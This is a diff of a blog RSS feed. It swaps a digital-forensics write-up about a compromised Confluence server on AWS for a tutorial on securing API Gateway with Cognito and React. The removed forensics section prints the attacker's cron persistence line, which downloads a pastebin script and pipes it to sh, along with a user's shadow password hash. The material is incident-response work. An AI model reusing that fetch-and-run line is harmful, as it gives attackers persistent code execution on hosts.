@@ -7,622 +7,81 @@
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
-        <title>Performing Digital Forensics on an AWS EBS Volume</title>
-        <description>&lt;p&gt;As a fellow Ops Engineer on the WebOps team here at Custom Ink I try to make InfoSEC a high priority and exercise &amp;#39;best practices&amp;#39; when it comes to building out Infrastructure. However, as you&amp;#39;re probably aware, ugh... &amp;#39;stuff&amp;#39; happens!  😜 This post will be a relatively deep dive into a &lt;em&gt;fairly&lt;/em&gt; recent compromise we experienced and details on conducting a digital forensics analysis on an AWS EBS volume.    &lt;/p&gt;
+        <title>Authorization with API Gateway, Cognito and React</title>
+        <description>&lt;p&gt;I&amp;#39;ve been experimenting with using &lt;a href=&quot;https://aws.amazon.com/cognito/&quot;&gt;Amazon Cognito User Pools&lt;/a&gt; in conjunction with the Amplify Javascript library to handle user authentication in our Single Page applications. One of the problems I ran into was finding a way to restrict my API to only be accessible to authorized users. Cognito, API Gateway, and Amplify made this easy to do.&lt;/p&gt;
 
-&lt;!--more--&gt;
+&lt;h3 id=&quot;configure-api-gateway&quot;&gt;Configure API Gateway&lt;/h3&gt;
 
-&lt;h1 id=&quot;setting-the-stage&quot;&gt;Setting the Stage&lt;/h1&gt;
+&lt;p&gt;From your API Gateway settings in the AWS Console, select &lt;em&gt;Authorizers&lt;/em&gt;, and then choose &lt;em&gt;Create new authorizer&lt;/em&gt;.&lt;/p&gt;
 
-&lt;p&gt;So picture yourself as an Ops Engineer, head phones on, coffee mug full, happily hacking away on your &lt;a href=&quot;https://supermarket.chef.io/&quot;&gt;OpsChef cookbook&lt;/a&gt;. Then you happen to, out the corner of your eye, glance at your secondary monitor running Slack and see messages like &amp;quot;Confluence seems to be down&amp;quot;! Ugh... well that&amp;#39;s not good people use that!  😝 So headphones goes off and it&amp;#39;s time to enter, what I like to secretly call, &amp;#39;WebOps beast mode&amp;#39;! 😤&lt;/p&gt;
+&lt;p&gt;Enter in the name and domain of your AWS Cognito User pool.&lt;/p&gt;
 
-&lt;p&gt;After logging into our Confluence instance we noticed a process with ~200% CPU utilization! After a quick Google search we hit an &lt;a href=&quot;https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html?_ga=2.84510736.880050261.1555700079-1786195807.1555006968&quot;&gt;Atlassian post&lt;/a&gt; describing a vulnerability in a couple Confluence plugins that were being exploited; resulting in the installation of some malware which installs a cryptocurrency miner!&lt;/p&gt;
+&lt;p&gt;Under &lt;code&gt;Token Source&lt;/code&gt; add &lt;code&gt;Authorization&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;So I did a &lt;em&gt;kill -9&lt;/em&gt; on this suspicious process. It immediately came back! After checking some crontabs I found an entry where a &lt;em&gt;very suspicious&lt;/em&gt; job was grabbing a script from pastebin! I recall thinking to myself &amp;#39;that&amp;#39;s not good&amp;#39;! I deleted this job from crontab and it immediately came back! At this point one thing was clear: &lt;strong&gt;Houston we have a problem!&lt;/strong&gt; 😒 &lt;/p&gt;
+&lt;p&gt;It should look something like this:&lt;/p&gt;
 
-&lt;h1 id=&quot;performing-digital-forensics-analysis-on-an-aws-ebs-volume&quot;&gt;Performing Digital Forensics Analysis on an AWS EBS Volume&lt;/h1&gt;
+&lt;p&gt;&lt;img src=/assets/content/api-gateway/authorization-8c96576ad0783e5d3dc2d2afd0fd00362a1b8eb6fbccb2e54c01fc8dd9948763.png alt=&quot;api-gateway=authorizer&quot; class=&quot;tb-Img tb-Img--responsive-ctr tb-Img--fancy&quot;/&gt;&lt;/p&gt;
 
-&lt;h2 id=&quot;tools-used&quot;&gt;Tools Used&lt;/h2&gt;
+&lt;p&gt;Next, go to the method that you’d like to restrict, and select &lt;em&gt;Method Request&lt;/em&gt;. The new authorizer that you created should now be listed. Go ahead and select it, and deploy your newly authorized API.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://digital-forensics.sans.org/community/downloads&quot;&gt;SIFT&lt;/a&gt; ( SANS Investigative Forensics Toolkit )&lt;/p&gt;
-
-&lt;h2 id=&quot;evidence-gathering&quot;&gt;Evidence Gathering&lt;/h2&gt;
-
-&lt;h3 id=&quot;mount-ebs-vol-read-only&quot;&gt;Mount EBS vol. read-only.&lt;/h3&gt;
-
-&lt;p&gt;Note: I&amp;#39;m using a &lt;strong&gt;snapshot&lt;/strong&gt; of the originally compromised EBS volume and it&amp;#39;s mounted read-only on an EC2 instance where SIFT is installed.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:/# mkdir /mnt/disk1
-root@siftworkstation:~# mount -o ro /dev/xvdf1 /mnt/disk1
+&lt;p&gt;Once the API is deployed, you should verify that it is indeed being restricted. Curl the deployed URL, and you should get back a 403 that looks like this:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nl&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Missing Authentication Token&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;run-a-clamav-virus-scan&quot;&gt;Run a &lt;a href=&quot;https://www.clamav.net/&quot;&gt;ClamAV&lt;/a&gt; virus scan&lt;/h3&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# screen
-root@siftworkstation:~# cd /tmp
-root@siftworkstation:/tmp# clamscan --verbose --log=/var/log/virus-scan-compromised-ebs-inkernet --recursive=yes /mnt/disk1/
------------ SCAN SUMMARY -----------
-Known viruses: 6108873
-Engine version: 0.100.3
-Scanned directories: 47853
-Scanned files: 112317
-Infected files: 0
-Data scanned: 9021.82 MB
-Data read: 20686.82 MB (ratio 0.44:1)
-Time: 7341.887 sec (122 m 21 s)
-Note: As of April 20, 2019 only 6 AntiVirus products have successfully detected this malware.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;search-for-know-indicators-of-compromise-via-loki&quot;&gt;Search for know indicators of compromise via &lt;a href=&quot;https://github.com/Neo23x0/Loki&quot;&gt;Loki&lt;/a&gt;.&lt;/h3&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:/tmp# cd /tmp/
-root@siftworkstation:/tmp# wget https://github.com/Neo23x0/Loki/archive/v0.29.2.tar.gz
-root@siftworkstation:/tmp# tar xf v0.29.2.tar.gz
-root@siftworkstation:/tmp# cd Loki-0.29.2
-root@siftworkstation:/tmp# python loki.py -p /mnt/disk1
-[INFO] Scanning /mnt/disk1 ...
-[NOTICE] Results: 0 alerts, 0 warnings, 6 notices
-[RESULT] SYSTEM SEEMS TO BE CLEAN.
-[NOTICE] Finished LOKI Scan SYSTEM: siftworkstation TIME: 20190417T00:55:56Z
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;check-cron-tab-for-anything-suspicious&quot;&gt;Check CRON tab for anything suspicious.&lt;/h3&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:# cat /mnt/disk1/etc/crontab
-root@siftworkstation:# ls /mnt/disk1/etc/cron.*
-root@siftworkstation:# find /mnt/disk1/var/spool/cron/* -exec cat {} \;
-*/10 * * * * (curl -fsSL https://pastebin.com/raw/wR3ETdbi||wget -q -O- https://pastebin.com/raw/wR3ETdbi)|sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;check-for-unusual-startup-scripts&quot;&gt;Check for unusual startup scripts.&lt;/h3&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# ls -als -t /mnt/disk1/etc/rc*.d/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;check-for-suspicious-files-in-tmp&quot;&gt;Check for suspicious files in /tmp.&lt;/h3&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# ls -alh /mnt/disk1/tmp/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;look-for-unusual-files-suid-set-none-found&quot;&gt;Look for unusual files ( SUID set ). None found.&lt;/h3&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# find /mnt/disk1/ -uid 0 -perm 4000 -print &amp;gt; /var/log/suid_inkernet_04_16.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;look-for-files-with-a-high-entropy&quot;&gt;Look for files with a high entropy.&lt;/h3&gt;
+&lt;h3 id=&quot;set-up-amplify&quot;&gt;Set up Amplify&lt;/h3&gt;
 
-&lt;p&gt;Note: This &lt;em&gt;could&lt;/em&gt; indicate a file that has been encrypted.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# densityscout -r -p 0.1 -l 0.1 -o /var/log/high_density_evidence.txt /mnt/disk1/
+&lt;p&gt;Follow the &lt;a href=&quot;https://aws-amplify.github.io/docs/js/authentication#automated-setup&quot;&gt;Amplify guide&lt;/a&gt; to configure your client application to work with your Cognito user pool. In this example, I added mine to a React application.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;#39;s say you have a component that makes an API call and retrieves items after it has mounted.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;React&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;useEffect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'react'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'aws-amplify'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fetchItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'./myApiHelpers.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TodoList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;setItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;useState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([]);&lt;/span&gt;
+
+  &lt;span class=&quot;nx&quot;&gt;useEffect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;Auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;currentAuthenticatedUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getSession&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sessionToken&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getIdToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jwtToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;nx&quot;&gt;fetchItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sessionToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ul&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;li&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/li&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;
+&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/ul&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
+&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;review-root-users-bash-history-clean&quot;&gt;Review root user&amp;#39;s bash history. Clean.&lt;/h3&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# cat  /mnt/disk1/root/.bash_profile
+&lt;p&gt;The key here is that Amplify gives you a method to get the JWT Token containing claims about the identity of the authenticated user. This is the token that the API Gateway Authorizer is expecting the client to send.&lt;/p&gt;
+
+&lt;p&gt;Finally, in your function to fetch the items, make sure to set the &lt;code&gt;Authorization&lt;/code&gt; header to the JWT token generated in the above function.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;k&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fetchItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sessionToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://my-api-gateway-url.com/items'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'GET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;s1&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'application/json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;s1&quot;&gt;'Authorization'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sessionToken&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;look-for-shell-accounts-with-passwords-set&quot;&gt;Look for shell accounts with passwords set.&lt;/h3&gt;
-
-&lt;p&gt;Note: This user is now using RSA key pairs for &lt;a href=&quot;https://www.openssh.com/&quot;&gt;SSH&lt;/a&gt; access and password removed from system.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# cat /mnt/disk1/etc/shadow |grep -F &quot;$&quot; &amp;gt; /var/log/users_with_passwords_inkernet_evidence.txt
-root@siftworkstation:~# cat /var/log/users_with_passwords_inkernet_evidence.txt
-user1:$6$BH2Vs.qf$WbCuhETLzkBDDJUIYU4.BA7.7ipyguhz7eaATrOMaqFH231kj/LDTJKXZwdhSzrW8VMQ4xuYz2zvkf6WTc7nh.:17835:0:99999:7:::
-root@siftworkstation:~# cat /mnt/disk1/etc/group |grep user1 
-sudo:x:27:ubuntu,user1
-user1:x:1011:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;get-a-list-of-boot-times-and-save-to-file-for-evidence&quot;&gt;Get a list of boot times and save to file for evidence.&lt;/h3&gt;
-
-&lt;p&gt;Note: /var/log/cloud-init.log should exist on the disk of all EC2 instances. A history of boot times is good to have so you know when this instances was on-line and rebooted.  &lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# grep Cloud-init /mnt/disk1/var/log/cloud-init.log &amp;gt; /var/log/cloud-init-log.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;identify-past-ip-addresses-local-routing-table-of-instance&quot;&gt;Identify past Ip addresses &amp;amp; local routing table of instance.&lt;/h3&gt;
-
-&lt;p&gt;Note: A history of local Ip address is good to have when building a timeline.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# grep &quot;ci-info&quot; /mnt/disk1/var/log/cloud-init-output.log &amp;gt; /var/log/past-ips-evidence.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;identify-apt-dpkg-history&quot;&gt;Identify Apt &amp;amp; dpkg history.&lt;/h3&gt;
-
-&lt;p&gt;Note: Good to have a history of recently installed packages. &lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# cat /mnt/disk1/var/log/apt/history.log &amp;gt; /var/log/apt-history-evidence.txt
-root@siftworkstation:~# cat /mnt/disk1/var/log/dpkg.log &amp;gt; /var/log/dpkg-log-evidence.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;perform-a-timeline-analysis-using-fls-and-mactime&quot;&gt;Perform a timeline analysis using &lt;a href=&quot;https://wiki.sleuthkit.org/index.php?title=Fls&quot;&gt;fls&lt;/a&gt; and &lt;a href=&quot;https://wiki.sleuthkit.org/index.php?title=Mactime&quot;&gt;mactime&lt;/a&gt;.&lt;/h3&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# fls -r -m / /dev/xvdf1 &amp;gt; /var/log/timeline-body.txt
-root@siftworkstation:~# mactime -b /var/log/timeline-body.txt -d &amp;gt; /var/log/timeline-evidence.csv
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;recover-unallocated-space-and-sort-files&quot;&gt;Recover unallocated space and sort files.&lt;/h3&gt;
-
-&lt;p&gt;Note: This simple technique can be used to recover deleted files depending on specific compute environment and how/when a file was deleted.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# mkdir /var/log/unalocated_space_evidence_inkernet
-root@siftworkstation:~# tsk_recover /dev/xvdf1 /var/log/unalocated_space_evidence_inkernet
-Files Recovered: 83104
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;get-a-list-of-md5-hashes-of-regular-files&quot;&gt;Get a list of md5 hashes of regular files.&lt;/h3&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# find /mnt/disk1/ -type f -exec /usr/bin/md5sum {} \; &amp;gt; /var/log/inkernet-root-disk-hashes.md5
-cat inkernet-root-disk-hashes.md5 |awk '{ print $2 }' &amp;gt; /var/log/inkernet-root-disk-files-to-VT.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;get-file-list-of-main-system-binaries-save-to-disk&quot;&gt;Get file list of main system binaries &amp;amp; save to disk.&lt;/h3&gt;
-
-&lt;p&gt;Note: Only gathering md5 hashes for sytem binaries to submit to VirusTotal due to API rate limits on a free VirusTotal API key.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;cat inkernet-root-disk-files-to-VT.txt |grep -E '/mnt/disk1/bin|/mnt/disk1/sbin/mnt/disk1/usr/local/bin|/mnt/disk1/usr/bin|/mnt/dist1/usr/sbin' &amp;gt; inkernet-root-disk-binaries-to-VT.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;submit-hashes-to-virustotal&quot;&gt;Submit hashes to &lt;a href=&quot;https://www.virustotal.com/gui/home/upload&quot;&gt;VirusTotal&lt;/a&gt;.&lt;/h3&gt;
-
-&lt;p&gt;Note: After submitting your list of hashes to VirusTotal, and they are processed, you can login to your free account to see if that hash matched a hash of know malware.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;virustotal-submit.py -k api_key_here -f /var/log/inkernet-root-disk-binaries-to-VT.txt &amp;gt; /var/log/virustotal-results-inkernet-evidence.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h3 id=&quot;search-for-installed-rootkits-using-rkhunter&quot;&gt;Search for installed rootkits using &lt;a href=&quot;https://sourceforge.net/projects/rkhunter/&quot;&gt;rkhunter&lt;/a&gt;.&lt;/h3&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# rkhunter --update
